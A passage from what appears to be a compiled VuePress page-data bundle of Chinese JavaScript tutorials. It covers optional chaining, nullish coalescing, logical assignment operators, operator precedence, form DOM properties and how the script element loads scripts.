message?.body?.user?.firstname || 'default';\nconst foovalue = myform.queryselector('input[name=foo]')?.value\n\n\n?.运算符，直接在链式调用的时候判断，左侧的对象是否为null或undefined。如果是的，就不再往下运算，而是返回undefined\n\n// 下面是判断对象方法是否存在，如果存在就立即执行的例子。\niterator.return?.()\n\n\n\n# null 判断运算符 ??\n\n读取对象属性的时候，如果某个属性的值是null或undefined，有时候需要为它们指定默认值。常见做法是通过||运算符指定默认值。\n\n只要属性的值为null或undefined，默认值就会生效，但是属性的值如果为空字符串或false或0，默认值也会生效\n\nconst headertext = response.settings.headertext || 'hello, world!';\nconst animationduration = response.settings.animationduration || 300;\nconst showsplashscreen = response.settings.showsplashscreen || true;\n\n\nnull 判断运算符??。它的行为类似||，但是只有运算符左侧的值为null或undefined时，才会返回右侧的值。\n\nconst headertext = response.settings.headertext ?? 'hello, world!';\nconst animationduration = response.settings.animationduration ?? 300;\nconst showsplashscreen = response.settings.showsplashscreen ?? true;\n\n\n跟链判断运算符?.配合使用，为null或undefined的值设置默认值。\n\nconst animationduration = response.settings?.animationduration ?? 300;\n\n\n多个逻辑运算符一起使用，必须用括号表明优先级，否则会报错。\n\n// 报错\nlhs && middle ?? rhs\nlhs ?? middle && rhs\nlhs || middle ?? rhs\nlhs ?? middle || rhs\n\n\n\n# 逻辑赋值运算符\n\n> es2021 引入了三个新的逻辑赋值运算符（logical assignment operators），将逻辑运算符与赋值运算符进行结合。\n\n// 或赋值运算符\nx ||= y\n// 等同于\nx || (x = y)\n\n// 与赋值运算符\nx &&= y\n// 等同于\nx && (x = y)\n\n// null 赋值运算符\nx ??= y\n// 等同于\nx ?? (x = y)\n// 这三个运算符||=、&&=、??=相当于先进行逻辑运算，然后根据运算结果，再视情况进行赋值运算。\n\n\n它们的一个用途是，为变量或属性设置默认值。\n\n// 老的写法\nuser.id = user.id || 1;\n\n// 新的写法\nuser.id ||= 1;\n\n// 老的写法\nfunction example(opts) {\n  opts.foo = opts.foo ?? 'bar';\n  opts.baz ?? (opts.baz = 'qux');\n}\n\n// 新的写法\nfunction example(opts) {\n  opts.foo ??= 'bar';\n  opts.baz ??= 'qux';\n}\n\n\n\n# 运算符的优先级\n\n> 下表中的运算符按从最高到最低的优先级列出。具有相同优先级的运算符按从左至右的顺序求值。\n\n运算符                                                运算符类型\n(…)                                                圆括号\n….…, …[…] ,new…(…),…(…)                            成员访问,需计算的成员访问,new(带参数列表),函数调用\nnew …                                              new(无参数列表)\n…++, …--                                           后置递增(运算符在后) 后置递减(运算符在后)\n!…,~…,+…,-…,++…,--…,typeof…,void…,delete…,await…   逻辑非 按位非 一元加法 一元减法 前置递增 前置递减 typeof void delete await\n…**…                                               幂\n…*… …/… …%…                                        乘法 除法 取余\n+ -                                                加法 减法\n< <= > >= in instanceof                            小于 小于等于 大于 大于等于 in 判断是否为这个构造函数实例化\n== != === !==                                      等号 非等 全等 非全等\n&&                                                 逻辑与\n¦¦                                                 逻辑或\n… ? … : …                                          三元运算符\n= += -= *= /= %= **=                               赋值\n,                                                  逗号\n\n",charsets:{cjk:!0}},{title:"表单操作",frontmatter:{},regularPath:"/Javascript/JavaScriptDOM%E6%93%8D%E4%BD%9C/%E8%A1%A8%E5%8D%95%E6%93%8D%E4%BD%9C.html",relativePath:"Javascript/JavaScriptDOM操作/表单操作.md",key:"v-74049526",path:"/Javascript/JavaScriptDOM%E6%93%8D%E4%BD%9C/%E8%A1%A8%E5%8D%95%E6%93%8D%E4%BD%9C.html",headers:[{level:2,title:"表单Form",slug:"表单form",normalizedTitle:"表单form",charIndex:11},{level:3,title:"获得Form对象引用",slug:"获得form对象引用",normalizedTitle:"获得form对象引用",charIndex:22},{level:3,title:"Form 对象属性",slug:"form-对象属性",normalizedTitle:"form 对象属性",charIndex:267},{level:3,title:"Form 对象方法",slug:"form-对象方法",normalizedTitle:"form 对象方法",charIndex:425},{level:3,title:"Form 对象事件",slug:"form-对象事件",normalizedTitle:"form 对象事件",charIndex:503},{level:2,title:"表单元素",slug:"表单元素",normalizedTitle:"表单元素",charIndex:414},{level:3,title:"获得表单元素的引用",slug:"获得表单元素的引用",normalizedTitle:"获得表单元素的引用",charIndex:587},{level:3,title:"表单控件的属性",slug:"表单控件的属性",normalizedTitle:"表单控件的属性",charIndex:834},{level:3,title:"表单控件的事件",slug:"表单控件的事件",normalizedTitle:"表单控件的事件",charIndex:1020},{level:3,title:"表单控件的方法",slug:"表单控件的方法",normalizedTitle:"表单控件的方法",charIndex:1132},{level:3,title:"select控件",slug:"select控件",normalizedTitle:"select控件",charIndex:1217},{level:3,title:"单选、多选控件",slug:"单选、多选控件",normalizedTitle:"单选、多选控件",charIndex:1584}],headersStr:"表单Form 获得Form对象引用 Form 对象属性 Form 对象方法 Form 对象事件 表单元素 获得表单元素的引用 表单控件的属性 表单控件的事件 表单控件的方法 select控件 单选、多选控件",content:'# 表单操作\n\n\n# 表单Form\n\n\n# 获得Form对象引用\n\n 1. 通过直接定位的方式来获取\n\ndocument.getElementById();\ndocument.getElementsByName();\ndocument.getElementsByTagName();\n\n\n 2. 通过集合的方式来获取引用\n\ndocument.forms[]\ndocument.forms["name"]\ndocument.forms.name\n\n\n 3. 通过name直接获取（只适用于表单）\n\ndocument.name\n\n\n\n# Form 对象属性\n\n属性         描述\naction     接收请求的URL\nelements   表单中的所有控件元素集合\nlength     表单控件的个数\nenctype    编码类型 例：enctype=“multipart/form-data”\nname       表单元素名称\n\n\n# Form 对象方法\n\n方法         描述\nreset()    把表单的所有输入元素重置为它们的默认值。\nsubmit()   提交表单。\n\n\n# Form 对象事件\n\n事件         描述\nonreset    在重置表单元素之前调用。\nonsubmit   在提交表单之前调用。\n\n\n# 表单元素\n\n\n# 获得表单元素的引用\n\n 1. 直接获取\n\ndocument.getElementById();\ndocument.getElementsByName();\ndocument.getElementsByTagName();\n\n\n 2. 通过集合来获取\n\n表单对象.elements 获得表单里面所有元素的集合\n表单对象.elements[下标]\n表单对象.elements["name"]\n表单对象.elements.name\n\n\n 3. 直接通过name的形式\n\n表单对象.name\n\n\n\n# 表单控件的属性\n\n属性         描述\nvalue      获取和设置值\ndisabled   获取或设置表单控件是否禁用值为true或 false\ntype       读取表单控件的类型\nform       所在表单元素对象\nreadOnly   控件只读属性 Boolean 不能更改只能复制和读取\nname       获取与设置name字段名\n\n\n# 表单控件的事件\n\n事件         描述\nonblur     当失去焦点的时候\nonfocus    当获取焦点的时候\nonchange   当内容改变并失去焦点的时候\noninput    在用户输入时触发\n\n\n# 表单控件的方法\n\n方法         描述\nfocus()    获得焦点\nblur()     失去焦点\nselect()   选择文本控件中的所有文本内容\n\n\n# select控件\n\n# select控件属性\n\n属性              描述\nlength          选项的个数\nsize            取得size属性\nmultiple        是否是多选 Boolean类型\noptions         所有option选项\nselectedIndex   设置或返回的选中索引值\nselected        设置或返回选项的选中状态\n\n# option控件属性\n\n属性         描述\nindex      选项在options的索引值\nselected   当前selected 是否选中 Boolean\ntext       文本内容\nvalue      value属性的值\n\n> 注：标准DOM中如果没有value属性，返回text\n\n\n# 单选、多选控件\n\n属性        描述\nchecked   返回或者设置单选的选中状态，true选中 false 未选中\nvalue     属性 获取选中的值，必须先判断选中状态。',normalizedContent:'# 表单操作\n\n\n# 表单form\n\n\n# 获得form对象引用\n\n 1. 通过直接定位的方式来获取\n\ndocument.getelementbyid();\ndocument.getelementsbyname();\ndocument.getelementsbytagname();\n\n\n 2. 通过集合的方式来获取引用\n\ndocument.forms[]\ndocument.forms["name"]\ndocument.forms.name\n\n\n 3. 通过name直接获取（只适用于表单）\n\ndocument.name\n\n\n\n# form 对象属性\n\n属性         描述\naction     接收请求的url\nelements   表单中的所有控件元素集合\nlength     表单控件的个数\nenctype    编码类型 例：enctype=“multipart/form-data”\nname       表单元素名称\n\n\n# form 对象方法\n\n方法         描述\nreset()    把表单的所有输入元素重置为它们的默认值。\nsubmit()   提交表单。\n\n\n# form 对象事件\n\n事件         描述\nonreset    在重置表单元素之前调用。\nonsubmit   在提交表单之前调用。\n\n\n# 表单元素\n\n\n# 获得表单元素的引用\n\n 1. 直接获取\n\ndocument.getelementbyid();\ndocument.getelementsbyname();\ndocument.getelementsbytagname();\n\n\n 2. 通过集合来获取\n\n表单对象.elements 获得表单里面所有元素的集合\n表单对象.elements[下标]\n表单对象.elements["name"]\n表单对象.elements.name\n\n\n 3. 直接通过name的形式\n\n表单对象.name\n\n\n\n# 表单控件的属性\n\n属性         描述\nvalue      获取和设置值\ndisabled   获取或设置表单控件是否禁用值为true或 false\ntype       读取表单控件的类型\nform       所在表单元素对象\nreadonly   控件只读属性 boolean 不能更改只能复制和读取\nname       获取与设置name字段名\n\n\n# 表单控件的事件\n\n事件         描述\nonblur     当失去焦点的时候\nonfocus    当获取焦点的时候\nonchange   当内容改变并失去焦点的时候\noninput    在用户输入时触发\n\n\n# 表单控件的方法\n\n方法         描述\nfocus()    获得焦点\nblur()     失去焦点\nselect()   选择文本控件中的所有文本内容\n\n\n# select控件\n\n# select控件属性\n\n属性              描述\nlength          选项的个数\nsize            取得size属性\nmultiple        是否是多选 boolean类型\noptions         所有option选项\nselectedindex   设置或返回的选中索引值\nselected        设置或返回选项的选中状态\n\n# option控件属性\n\n属性         描述\nindex      选项在options的索引值\nselected   当前selected 是否选中 boolean\ntext       文本内容\nvalue      value属性的值\n\n> 注：标准dom中如果没有value属性，返回text\n\n\n# 单选、多选控件\n\n属性        描述\nchecked   返回或者设置单选的选中状态，true选中 false 未选中\nvalue     属性 获取选中的值，必须先判断选中状态。',charsets:{cjk:!0}},{title:"ECMAScript 介绍",frontmatter:{},regularPath:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/01-ECMAScript%E4%BB%8B%E7%BB%8D.html",relativePath:"Javascript/Javascript基础语法/01-ECMAScript介绍.md",key:"v-520e8ad4",path:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/01-ECMAScript%E4%BB%8B%E7%BB%8D.html",headers:[{level:2,title:"应用场景",slug:"应用场景",normalizedTitle:"应用场景",charIndex:351},{level:2,title:"JavaScript 组成部分",slug:"javascript-组成部分",normalizedTitle:"javascript 组成部分",charIndex:693},{level:2,title:"ECMAScript 版本",slug:"ecmascript-版本",normalizedTitle:"ecmascript 版本",charIndex:989},{level:3,title:"ECMAScript 2015（ES6）浏览器支持情况",slug:"ecmascript-2015-es6-浏览器支持情况",normalizedTitle:"ecmascript 2015（es6）浏览器支持情况",charIndex:1250},{level:2,title:"JavaScript 在你的页面上做什么？",slug:"javascript-在你的页面上做什么",normalizedTitle:"javascript 在你的页面上做什么？",charIndex:1482},{level:2,title:"浏览器安全",slug:"浏览器安全",normalizedTitle:"浏览器安全",charIndex:1758},{level:2,title:"JavaScript 特点",slug:"javascript-特点",normalizedTitle:"javascript 特点",charIndex:1895},{level:3,title:"解释代码 vs 编译代码",slug:"解释代码-vs-编译代码",normalizedTitle:"解释代码 vs 编译代码",charIndex:2059},{level:3,title:"异步编程",slug:"异步编程",normalizedTitle:"异步编程",charIndex:2314},{level:2,title:"怎样向你的页面添加 JavaScript？",slug:"怎样向你的页面添加-javascript",normalizedTitle:"怎样向你的页面添加 javascript？",charIndex:2529},{level:3,title:"嵌入 HTML 的 JavaScript",slug:"嵌入-html-的-javascript",normalizedTitle:"嵌入 html 的 javascript",charIndex:2711},{level:3,title:"外部引入的 JavaScript",slug:"外部引入的-javascript",normalizedTitle:"外部引入的 javascript",charIndex:2783},{level:3,title:"script 元素",slug:"script-元素",normalizedTitle:"script 元素",charIndex:2914},{level:2,title:"注释",slug:"注释",normalizedTitle:"注释",charIndex:4150},{level:2,title:"输入输出工具",slug:"输入输出工具",normalizedTitle:"输入输出工具",charIndex:4312},{level:2,title:"名词解释",slug:"名词解释",normalizedTitle:"名词解释",charIndex:4589},{level:3,title:"标识符",slug:"标识符",normalizedTitle:"标识符",charIndex:4598},{level:3,title:"声明",slug:"声明",normalizedTitle:"声明",charIndex:4798},{level:3,title:"错误类型",slug:"错误类型",normalizedTitle:"错误类型",charIndex:4933},{level:3,title:"语句结尾分号",slug:"语句结尾分号",normalizedTitle:"语句结尾分号",charIndex:5302},{level:2,title:"参考",slug:"参考",normalizedTitle:"参考",charIndex:5593},{level:2,title:"注意事项",slug:"注意事项",normalizedTitle:"注意事项",charIndex:5615},{level:3,title:"script 元素使用",slug:"script-元素使用",normalizedTitle:"script 元素使用",charIndex:5624},{level:3,title:"标签位置",slug:"标签位置",normalizedTitle:"标签位置",charIndex:7188},{level:3,title:"推迟执行脚本",slug:"推迟执行脚本",normalizedTitle:"推迟执行脚本",charIndex:7996},{level:3,title:"异步执行脚本",slug:"异步执行脚本",normalizedTitle:"异步执行脚本",charIndex:8543},{level:3,title:"动态加载脚本",slug:"动态加载脚本",normalizedTitle:"动态加载脚本",charIndex:9062},{level:3,title:"<noscript>元素",slug:"noscript-元素",normalizedTitle:"<noscript>元素",charIndex:9800}],headersStr:"应用场景 JavaScript 组成部分 ECMAScript 版本 ECMAScript 2015（ES6）浏览器支持情况 JavaScript 在你的页面上做什么？ 浏览器安全 JavaScript 特点 解释代码 vs 编译代码 异步编程 怎样向你的页面添加 JavaScript？ 嵌入 HTML 的 JavaScript 外部引入的 JavaScript script 元素 注释 输入输出工具 名词解释 标识符 声明 错误类型 语句结尾分号 参考 注意事项 script 元素使用 标签位置 推迟执行脚本 异步执行脚本 动态加载脚本 <noscript>元素",content:'# ECMAScript 介绍\n\n🎉 💯\n\n> JavaScript 是世界上最流行的脚本语言，因为你在电脑、手机、平板上浏览的所有的网页，以及无数基于 HTML5 的手机 App，交互逻辑都是由 JavaScript 驱动的。我们可以通过 JavaScript 提供的 API 可以实现一些交互效果开发，使用 Ajax 可以与后台进行数据的交互。在 Web 世界里，只有 JavaScript 能跨平台、跨浏览器驱动网页，与用户交互。\n\nJavaScript 是一门跨平台、面向对象的动态的弱类型的轻量级解释型语言，是一种基于对象和事件驱动并具有相对安全性的客户端脚本语言。\n\n虽然它是作为开发 Web 页面的脚本语言而出名的，但是它也被用到了很多非浏览器环境中，例如 node.js。\n\n\n# 应用场景\n\nWARNING\n\nJavaScript 通常被称为 JS，他发明的目的，就是作为浏览器的内置脚本语言，为网页开发者提供操控浏览器的能力，他可以让网页呈现出各种特殊效果，为用户提供友好的互动体验。随着 Ajax 技术的出现，前端可以在不刷新页面的情况下和后端进行数据交换，更新页面数据，jQuery 等库的盛行让 JS 编写变得异常简单，Bootstrap 框架更让前端的成本无限降低，大大提高了前端开发的效率，JS 在前端领域前景非常广阔。\n\n随着 Node 的发布，使得 JS 不仅可以运行在前端，还可以运行在服务器上。这对 JS 来说是一次质的突破，Node.js 项目使得 JS 可以用于开发服务器端的大型项目，网站的前后端都用 JS 开发已经称为了现实。\n\n\n# JavaScript 组成部分\n\nTIP\n\n尽管 ECMAScript 是一个重要的标准，但它并不是 JavaScript 唯一的部分，当然，也不是唯一被标准化的部分。实际上，一个完整的 JavaScript 实现是由以下 3 个不同部分组成的：\n\n名称            介绍\nECMAScript    是 Javascript 基础规范，定义了 Javascript 基础语法。\nBOM 浏览器对象模型   可以对浏览器窗口进行访问和操作。\nDOM 文档对象模型    通过创建树来表示文档，从而使开发者对文档的内容和结构具有控制力。用 DOM API 可以轻松操作文档。\n\n\n# ECMAScript 版本\n\n从 ECMAScript2016 开始，ECMAScript 将进入每年发布一次新标准的阶段。\n\nES1    ES2    ES3    ES4   ES5    ES5.1   ES2015(ES6)   ES2016   ES2017   ES2018   ES2019   ...\n1997   1998   1999   夭折    2009   2011    2015          2016     2017     2018     2019     ....\n\n\n# ECMAScript 2015（ES6）浏览器支持情况\n\n支持 ECMAScript 2015 规范。功能包括 Promises，Modules，Classes，Template Literals，Arrow Functions，Let and Const，Default Parameters，Generators，Destructuring Assignment，Rest＆Spread，Map / Set＆WeakMap / WeakSet 等等。\n\n\n# JavaScript 在你的页面上做什么？\n\n当你在浏览器中打开一个网页，该运行环境（浏览器标签）将会执行你的代码（HTML, CSS 和 JavaScript）。这就像是一个工厂，获取原材料（代码）然后出产一个产品（网页）。\n\n在 HTML 和 CSS 已经被集合和组装成一个网页后，浏览器的 JavaScript 引擎再执行 JavaScript。这保证了当 JavaScript 开始运行时，网页的结构和样式已经在该出现的地方了。\n\n> 注意：如果 JavaScript 在 HTML 和 CSS 加载完成之前加载运行，那么会发生错误。\n\n\n# 浏览器安全\n\n每个浏览器标签本身就是一个用来运行代码的分离的容器（这些容器用专业术语称为“运行环境”）——这意味着在大多数情况中，每个标签中的代码是完全分离地运行，而且在一个标签中的代码不能直接影响在另一个标签中的代码——或者在另一个网站中的。这是一个好的安全措施\n\n\n# JavaScript 特点\n\n 1. 弱类型\n    JavaScript 是弱类型语言。但所谓弱类型语言，只表明该语言在表达式运算中不强制效验运算元的数据类型。\n 2. 解释型(解释型或即时编译型)\n 3. 基于对象\n    js 种所有数据根源上都是对象\n 4. 事件驱动\n 5. 单线程/异步(callback)\n\n\n# 解释代码 vs 编译代码\n\n在编程环境中，你或许听说过这两个术语 解释 [interpreted] 和 编译 [compiled]。JavaScript 是一个解释语言——代码从上到下运行，而运行的结果会马上被返回。在浏览器运行代码前，你不必先把它转化为其他形式。\n\n另一方面来说，编译语言则需要在运行前转化为另一种形式。比如说 C/C++ 则要先被编译成汇编语言，然后再由电脑运行。\n\n解释型语言的程序不需要在运行前编译，在运行程序的时候才翻译。省去编译过程，但是每执行一次就要翻译一次，效率比较低\n\n\n# 异步编程\n\nJavaScript 由于某种原因是被设计为单线程的，同时由于 JavaScript 在设计之初是用于浏览器的 GUI 编程，这也就需要线程不能进行阻塞。\n\n所以在后续的发展过程中基本都采用异步非阻塞的编程模式。\n\n简单来说，异步编程就是在执行一个指令之后不是马上得到结果，而是继续执行后面的指令，等到特定的事件触发后，才得到结果。\n\n也正是因为这样，我们常常会说: JavaScript 是由事件驱动的 。\n\n\n# 怎样向你的页面添加 JavaScript？\n\nJavaScript 以一种近似于 CSS 的方式应用到你的 HTML 页面中。尽管 CSS 使用 <link> 元素去应用外部的样式表 [stylesheet] 和 <style> 元素去应用内部的样式表到 HTML，JavaScript 只需要在 HTML 世界里的一个元素—— <script> 元素。\n\n\n# 嵌入 HTML 的 JavaScript\n\n<script>\n  // JavaScript goes here\n<\/script>\n\n\n\n# 外部引入的 JavaScript\n\n外部的 JavaScript 命名为 script.js ——保证它以 .js 为文件扩展名，因为这是它被认作是 JavaScript 的方式。\n\n<script src="script.js"><\/script>\n\n\n\n# script 元素\n\n参数            描述   示例\nasync         可选   表示应该立即开始下载脚本，但不能阻止其他页面动作，比如下载资源或等待其他脚本加载。只对外部脚本文件有效。\ncharset       可选   使用 src 属性指定的代码字符集。这个属性很少使用，因为大多数浏览器不在乎它的值\ncrossorigin   可选   配置相关请求的CORS（跨源资源共享）设置。默认不使用CORS。crossorigin=\n                   "anonymous"配置文件请求不必设置凭据标志crossorigin="use-credentials"设置凭据标志，意味着出站请求会包含凭据。\ndefer         可选   可选。表示脚本可以延迟到文档完全被解析和显示之后再执行。只对外部脚本文件有效。在 IE7\n                   及更早的版本中，对行内脚本也可以指定这个属性。\nintegrity     可选   允许比对接收到的资源和指定的加密签名以验证子资源完整性（SRI，Subresource\n                   Integrity）。如果接收到的资源的签名与这个属性指定的签名不匹配，则页面会报错，脚本不会执行。这个属性可以用于确保内容分发网络（CDN，Content\n                   Delivery Network）不会提供恶意内容。\nlanguage      废弃   最初用于表示代码块中的脚本语言（如"JavaScript"、"JavaScript\n                   1.2"或"VBScript"）。大多数浏览器都会忽略这个属性，不应该再使用它。\nsrc           可选   表示包含要执行的代码的外部文件。\ntype          可选   代替 language，表示代码块中脚本语言的内容类型（也称 MIME 类型）\n                   按照惯例，这个值始终都是"text/javascript"，尽管"text\n                   javascript"和"text/ecmascript"都已经废弃了。JavaScript 文件的 MIME\n                   类型通常是"application/x-javascript"，不过给type 属性这个值有可能导脚本被忽略。在非 IE\n                   的浏览器中有效的其他值还有"application/javascript"和"application/ecmascript"。如果这个值是\n                   module，则代码会被当成 ES6 模块，而且只有这时候代码中才能出现 import 和 export 关键字。\n\n\n# 注释\n\n> 可以添加注释来对 JavaScript 进行解释，提高代码的可读性，还可以用于停靠代码。\n\n一个单行注释书写在一个双正斜杠后 (//)，比如：\n\n// I am a comment\n\n\n一个多行注释书写在字符串/*和 */ 之间， 比如：\n\n/*\n  I am also\n  a comment\n*/\n\n\n\n# 输入输出工具\n\n方法                 描述              示例\ndocument.write()   输出内容到 body 页面   documetn.write("hello, world")\nprompt()           输入框             prompt("请输入信息")\nalert()            弹出框             alert("用户名错误")\nconsole.log()      输出内容到浏览器控制台     console.log("js是一门编程语言")\n\n\n# 名词解释\n\n\n# 标识符\n\n标识符可以分为两类：\n\n * 用于命名语法(以及类型)，被称为"语法关键字"\n * 用于命名值(的存储位置)，被称为"变量"和"常量"\n\n由此引入了一个概念：绑定。 从标识符的角度来说，就分为：\n\n * 语法关键字与语法(语义)逻辑的绑定，语法关键字与语法(语义)逻辑绑定的结果是作用域的限定；\n * 变量与它所存储值得位置的绑定，变量对位置的绑定的结果，则是变量生存周期的限定；\n\n\n# 声明\n\n程序语言中"声明"的意义：所谓声明，即是约定变量的生存周期和逻辑的作用域。\n\n * 纯粹陈述"值"的过程，被称为变量和类型声明；\n * 纯粹陈述"逻辑"的过程，被称为语句(含流程控制子句)；\n * 陈述"值与(算法的)逻辑"的关系的过程，被称为表达式；\n\n\n# 错误类型\n\n一般来说，当你的代码出错的时候，你会遇到两种主要的错误类型：\n\n# 语法错误\n\n这是你的代码的拼写错误，实际上导致程序不能运行在所有或停止通过工作的一部分，这样你通常会用一些提供的错误消息找到修复的方法，只要你熟悉正确的工具，知道错误消息的意思！\n\n一般来说，JavaScript 引擎会在代码装入时先进行语法分析，如果语法分析通不过，整个脚本代码块都不会执行；(如一个人在演讲时，先检查演讲稿语句是否通顺，不通顺则不讲)\n\n当语法分析通过时，才会执行这段脚本代码。若在执行过程中出错，那么在同一代码上下文中、出错点之后的代码将不再执行。\n\n# 逻辑错误\n\n这些错误，其中语法实际上是正确的，但代码是不是你想要的，这意味着项目成功运行，但会产生不正确的结果。这些通常比语法错误更难以修复，因为通常没有错误指向错误源。\n\n\n# 语句结尾分号\n\njs 语句的一个分号代表了一段代码的结束，但问题是 javascript 允许不写分号，这样就出现了一个问题，代码的结束与否不是你来决定的而是由程序来决定的，而程序也不是万能的，往往它只是走的某个规则，而如果你写的这段代码和它的规则不符，最终的结果就有些不如人意了。\n\nvar n1 = 10,\n  n2 = 100(n1 + n2) * 10; // 报错： 100 is not a function\n\n\n会导致上下行解析出问题的符号有 5 个：()，[]，\\，+，-。\n\n总结：一行开头是括号或者方括号的时候上一行必须分号结束，其他时候都可以不需要。\n\n\n# 参考\n\n * 参考1\n * 参考2\n\n\n# 注意事项\n\n\n# script 元素使用\n\n> 包含在<script>内的代码会被从上到下解释。在上面的例子中，被解释的是一个函数定义，并且 该函数会被保存在解释器环境中。在<script>元素中的代码被计算完成之前，页面的其余内容不会被 加载，也不会被显示。\n\n在使用行内 JavaScript 代码时，要注意代码中不能出现字符串。比如，下面的代码会导致浏览器报错：\n\n<script> \n function sayScript() { \n console.log("<\/script>"); \n } \n<\/script>\n\n\n浏览器解析行内脚本的方式决定了它在看到字符串时，会将其当成结束的 标签。想避免这个问题，只需要转义字符“\\”①即可：\n\n<script> \n function sayScript() { \n console.log("<\\/script>"); \n } \n<\/script>\n// 这样修改之后，代码就可以被浏览器完全解释，不会导致任何错误。\n\n\nTIP\n\n按照惯例，外部 JavaScript 文件的扩展名是.js。这不是必需的，因为浏览器不会检 查所包含 JavaScript 文件的扩展名。这就为使用服务器端脚本语言动态生成 JavaScript 代 码，或者在浏览器中将 JavaScript扩展语言（如TypeScript，或React的 JSX）转译为JavaScript 提供了可能性。不过要注意，服务器经常会根据文件扩展来确定响应的正确 MIME 类型。 如果不打算使用.js 扩展名，一定要确保服务器能返回正确的 MIME 类型。\n\n使用了 src 属性的<script>元素不应该再在<script>和<\/script>标签中再包含其他 JavaScript 代码。如果两者都提供的话，则浏览器只会下载并执行脚本文件，从而忽略行内代码.\n\n<script src="example.js">\n// 以下不执行\nconsole.log(1)\n<\/script>\n\n\n<script>元素的一个最为强大、同时也备受争议的特性是，它可以包含来自外部域的 JavaScript 文件。跟<img>元素很像，<script>元素的 src 属性可以是一个完整的 URL，而且这个 URL 指向的 资源可以跟包含它的 HTML 页面不在同一个域中，比如这个例子：\n\n<script src="http://www.somewhere.com/afile.js"><\/script>\n\n浏览器在解析这个资源时，会向 src 属性指定的路径发送一个 GET 请求，以取得相应资源，假定 是一个 JavaScript 文件。这个初始的请求不受浏览器同源策略限制，但返回并被执行的 JavaScript 则受限 制。当然，这个请求仍然受父页面 HTTP/HTTPS 协议的限制。\n\n来自外部域的代码会被当成加载它的页面的一部分来加载和解释。这个能力可以让我们通过不同的 域分发 JavaScript。\n\n不过，引用了放在别人服务器上的 JavaScript 文件时要格外小心，因为恶意的程序员 随时可能替换这个文件。在包含外部域的 JavaScript 文件时，要确保该域是自己所有的，或者该域是一 个可信的来源。\n\n<script>标签的 integrity 属性是防范这种问题的一个武器，但这个属性也不是所有 浏览器都支持。\n\n不管包含的是什么代码，浏览器都会按照<script>在页面中出现的顺序依次解释它们，前提是它 们没有使用 defer 和 async 属性。第二个<script>元素的代码必须在第一个<script>元素的代码解 释完毕才能开始解释，第三个则必须等第二个解释完，以此类推。`\n\n\n# 标签位置\n\n> 过去，所有<script>元素都被放在页面的<head>标签内，如下面的例子所示：\n\n<!DOCTYPE html> \n<html> \n <head> \n <title>Example HTML Page</title> \n <script src="example1.js"><\/script> \n <script src="example2.js"><\/script> \n </head> \n <body> \n \x3c!-- 这里是页面内容 --\x3e \n </body> \n</html>\n\n\nTIP\n\n这种做法的主要目的是把外部的 CSS 和 JavaScript 文件都集中放到一起。不过，把所有 JavaScript 文件都放在<head>里，也就意味着必须把所有 JavaScript 代码都下载、解析和解释完成后，才能开始渲 染页面（页面在浏览器解析到<body>的起始标签时开始渲染）。\n\n对于需要很多 JavaScript 的页面，这会导致页面渲染的明显延迟，在此期间浏览器窗口完全空白。为解决这个问题，现代 Web 应用程序通常 将所有 JavaScript 引用放在<body>元素中的页面内容后面，如下面的例子所示：\n\n<!DOCTYPE html> \n<html> \n <head> \n <title>Example HTML Page</title> \n </head> \n <body> \n \x3c!-- 这里是页面内容 --\x3e \n <script src="example1.js"><\/script> \n <script src="example2.js"><\/script> \n </body> \n</html>\n\x3c!-- 这样一来，页面会在处理 JavaScript 代码之前完全渲染页面。用户会感觉页面加载更快了，因为浏\n览器显示空白页面的时间短了。 --\x3e\n\n\n\n# 推迟执行脚本\n\n> HTML 4.01 为<script>元素定义了一个叫 defer 的属性。这个属性表示脚本在执行的时候不会改 变页面的结构。也就是说，脚本会被延迟到整个页面都解析完毕后再运行。因此，在<script>元素上 设置 defer 属性，相当于告诉浏览器立即下载，但延迟执行。\n\n<!DOCTYPE html> \n<html> \n <head> \n <title>Example HTML Page</title> \n <script defer src="example1.js"><\/script> \n <script defer src="example2.js"><\/script> \n </head> \n <body> \n \x3c!-- 这里是页面内容 --\x3e \n </body> \n</html> \n\n\n虽然这个例子中的<script>元素包含在页面的<head>中，但它们会在浏览器解析到结束的 </html>标签后才会执行。\n\n对 defer 属性的支持是从 IE4、Firefox 3.5、Safari 5 和 Chrome 7 开始的。其他所有浏览器则会忽略这 个属性，按照通常的做法来处理脚本。考虑到这一点，还是把要推迟执行的脚本放在页面底部比较好。\n\n\n# 异步执行脚本\n\n> HTML5 为<script>元素定义了 async 属性。从改变脚本处理方式上看，async 属性与 defer 类似。当然，它们两者也都只适用于外部脚本，都会告诉浏览器立即开始下载。不过，与 defer 不同的是，标记为 async 的脚本并不保证能按照它们出现的次序执行，比如：\n\n<!DOCTYPE html> \n<html> \n <head> \n <title>Example HTML Page</title> \n <script async src="example1.js"><\/script> \n <script async src="example2.js"><\/script> \n </head> \n <body> \n \x3c!-- 这里是页面内容 --\x3e \n </body> \n</html>\n\x3c!-- 在这个例子中，第二个脚本可能先于第一个脚本执行。因此，重点在于它们之间没有依赖关系。给\n脚本添加 async 属性的目的是告诉浏览器，不必等脚本下载和执行完后再加载页面，同样也不必等到\n该异步脚本下载和执行后再加载其他脚本。正因为如此，异步脚本不应该在加载期间修改 DOM。 --\x3e\n\n\n\n# 动态加载脚本\n\n除了<script>标签，还有其他方式可以加载脚本。因为 JavaScript 可以使用 DOM API，所以通过 向 DOM 中动态添加 script 元素同样可以加载指定的脚本。只要创建一个 script 元素并将其添加到 DOM 即可。\n\nlet script = document.createElement(\'script\'); \nscript.src = \'gibberish.js\'; \ndocument.head.appendChild(script);\n\n\n当然，在把 HTMLElement 元素添加到 DOM 且执行到这段代码之前不会发送请求。默认情况下， 以这种方式创建的<script>元素是以异步方式加载的，相当于添加了 async 属性。不过这样做可能会 有问题，因为所有浏览器都支持 createElement()方法，但不是所有浏览器都支持 async 属性。因此， 如果要统一动态脚本的加载行为，可以明确将其设置为同步加载：\n\nlet script = document.createElement(\'script\'); \nscript.src = \'gibberish.js\'; \nscript.async = false; \ndocument.head.appendChild(script);\n\n\n以这种方式获取的资源对浏览器预加载器是不可见的。这会严重影响它们在资源获取队列中的优先 级。根据应用程序的工作方式以及怎么使用，这种方式可能会严重影响性能。要想让预加载器知道这些 动态请求文件的存在，可以在文档头部显式声明它们： <link rel="preload" href="gibberish.js">\n\n\n# <noscript>元素\n\n> 针对早期浏览器不支持 JavaScript 的问题，需要一个页面优雅降级的处理方案。最终，<noscript> 元素出现，被用于给不支持 JavaScript 